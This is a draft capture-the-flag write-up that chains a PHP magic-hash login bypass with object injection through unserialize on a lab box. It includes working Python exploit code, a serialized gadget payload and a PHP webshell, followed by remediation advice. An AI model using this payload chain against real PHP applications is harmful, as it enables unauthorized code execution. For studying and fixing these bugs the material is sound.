---
title: "Marginalia: A Magic Hash, a Leftover .bak, and a Destructor That Writes"
date: 2026-10-16
draft: true
description: "Marginalia Press runs a tiny PHP submissions portal. A forgotten .bak in the webroot hands over the source, which reveals a loose md5 comparison guarding the editor login and a restore endpoint that unserializes anything you send it. Two bugs later: a webshell in the public cache directory."
tags: ["CTF", "Web Exploitation", "PHP", "Magic Hash", "Object Injection", "Deserialization"]
categories: ["Web"]
authors: ["z3ro"]
---

<div class="dr-hero">
  <div class="dr-hero-top">
    <span class="dr-badge">Web</span>
    <span class="dr-badge red">Medium</span>
    <span class="dr-badge cyan">200 pts</span>
    <span class="dr-badge ghost">r00t CTF · Marginalia</span>
  </div>
  <div class="dr-title">MARGINALIA</div>
  <p class="dr-sub">A small independent publisher called <strong>Marginalia Press</strong> runs a submissions portal with an editor login and a "restore manuscript backup" feature. The source was never meant to be public — but a <code>.bak</code> file was, and it explains every mistake the app makes.</p>
</div>

<div class="dr-stats">
  <div class="dr-stat"><span class="n red">2</span><span class="l">bugs, chained</span></div>
  <div class="dr-stat"><span class="n cyan">1</span><span class="l">.bak leaked</span></div>
  <div class="dr-stat"><span class="n">1</span><span class="l">gadget class</span></div>
  <div class="dr-stat"><span class="n">RCE</span><span class="l">as www-data</span></div>
</div>

## The setup

The portal renders three pages: a landing page, `known_issues.php`, and `editor_portal.php`. The interesting one is the "known issues" list, because one of the "issues" is a note to the developers:

```html
<li>The "Field Recordings" cover thumbnail is upside down. Cosmetic, low priority.</li>
<!-- TODO: remove editor_portal.php.bak from the webroot, leftover from the CMS migration -->
<li>Editor portal styling still uses the old CMS theme — cleanup planned for next quarter.</li>
```

That HTML comment is the whole foothold. `editor_portal.php.bak` is sitting in the webroot, served as plain text, complete with the source that generated the login page.

![The Marginalia chain: a leaked backup, two PHP bugs, and a webshell in the cache](/public/images/marginalia/00_chain.svg)

## Reading the source

The backup is short and candid. Two functions matter.

First, the editor authentication:

```php
// Editor auth. Loose comparison (==) between two md5 hashes
define('EDITOR_KEY_HASH', md5('240610708')); // 0e462097431906509019562988736854
...
if ($action === 'login') {
    $submitted = $_POST['editor_key'] ?? '';
    if (md5($submitted) == EDITOR_KEY_HASH) {
        $_SESSION['editor'] = true;
    } else {
        $error = 'Invalid editor key.';
    }
}
```

The developer used `==` to compare two **hashes**, and the stored hash (`md5('240610708')`) happens to be `0e462097431906509019562988736854` — a classic "magic hash". In PHP's loose comparison, a string that looks like `0e` followed by digits is treated as scientific notation, i.e. the number **0**. So any input whose md5 also starts with `0e` and is otherwise all digits compares equal to it.

Second, the restore handler:

```php
class BackupWriter {
    public $path;
    public $contents;

    public function __destruct() {
        $target = CACHE_DIR . basename($this->path);
        file_put_contents($target, $this->contents);
    }
}
...
if ($action === 'restore' && !empty($_SESSION['editor'])) {
    $raw = base64_decode($_POST['data'] ?? '', true);
    if ($raw !== false) {
        $obj = @unserialize($raw);          // <-- anything you want
        $restoreResult = 'Backup processed.';
    }
}
```

Chained with a logged-in session, the restore endpoint will **unserialize attacker-controlled bytes**. And `CACHE_DIR` is `__DIR__ . '/cache/'`, which the page itself describes as public:

> Backups restore into the public cache directory (/cache/) for CDN pickup — should probably not be public, ops hasn't gotten to it.

So a `BackupWriter` object that writes a `.php` file into `/cache/` is a webshell with a bow on it.

<div class="dr-callout danger">
  <span class="t">Two bugs, one chain</span>
  <p>Neither bug is enough alone. The magic hash gets you past the editor login; the object injection turns that access into arbitrary file write. Together they are unauthenticated remote code execution.</p>
</div>

## Step 1 — The magic-hash login

Because the comparison is loose, the literal value `240610708` (whose md5 is the stored magic hash) logs straight in. The exploit posts it and checks for the restore form:

```python
import base64, urllib.request, urllib.parse, http.cookiejar

BASE = "http://marginalia-8254.labs.perfectroot.io"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def post(path, fields):
    data = urllib.parse.urlencode(fields).encode()
    return op.open(urllib.request.Request(BASE + path, data=data), timeout=30).read().decode()

r = post("/editor_portal.php", {"action": "login", "editor_key": "240610708"})
print("logged in:", "Restore Manuscript" in r)
```

The response switches from the login card to the restore card. The session flag is set.

## Step 2 — The object-injection payload

Now we build the serialized `BackupWriter`. The PHP serialized form of an object with two string properties is simple, and the length prefixes must match the byte counts exactly:

```
O:12:"BackupWriter":2:{s:4:"path";s:7:"marg.php";s:8:"contents";s:30:"<?php system($_GET['c']); ?>";}
```

Base64 it, POST it as `data`, and the object is reconstructed during unserialize. When the request finishes and the object is garbage-collected, `__destruct()` fires and writes the payload to `CACHE_DIR . basename("marg.php")`:

```python
path, contents = "marg.php", "<?php system($_GET['c']); ?>"
ser = ('O:12:"BackupWriter":2:{'
       's:4:"path";s:%d:"%s";'
       's:8:"contents";s:%d:"%s";}') % (len(path), path, len(contents), contents)
post("/editor_portal.php", {"action": "restore", "data": base64.b64encode(ser.encode()).decode()})
```

## Step 3 — Executing

The shell lands in the directory the page already told us is web-served:

```python
def sh(cmd):
    q = urllib.parse.urlencode({"c": cmd})
    return op.open(BASE + "/cache/marg.php?" + q, timeout=60).read().decode()

print(sh("id"))
print(sh("ls -la /app /var/www 2>/dev/null"))
print(sh('grep -rIn "r00t{" /app /var/www /etc /opt /srv /home /tmp 2>/dev/null'))
```

<div class="dr-callout warn">
  <span class="t">Flag captured on the live instance</span>
  <p>This one was solved against the running box, and the flag was read from the filesystem at the time. I have not reproduced the final <code>grep</code> output here because the instance is no longer up — drop the real flag into the banner below when you publish.</p>
</div>

<div class="dr-flag">
  <span class="l">Flag</span>
  <code>r00t{&hellip;}</code>
</div>

## Root cause notes

Marginalia is two textbook PHP mistakes in one small app.

- **Never `==` two hashes.** Use `hash_equals()` for comparisons and, better, compare the *result* of a correct password hash (`password_verify`). Magic hashes (`0e…`) are an artifact of loose typing, not a real collision.
- **Never unserialize untrusted input.** PHP object injection turns any class with a useful `__destruct` / `__wakeup` into a gadget. The fix is `json_decode` or an allow-list of classes via the `allowed_classes` option.
- **Do not serve a writable directory.** The app's own comments admit `/cache/` should not be public. A web-writable directory plus a `.php` handler is a standing RCE.

The decoy class in the source (`SubmissionMeta`, with an intentionally inert destructor) is a nice touch — it rewards reading the code instead of guessing gadget names.
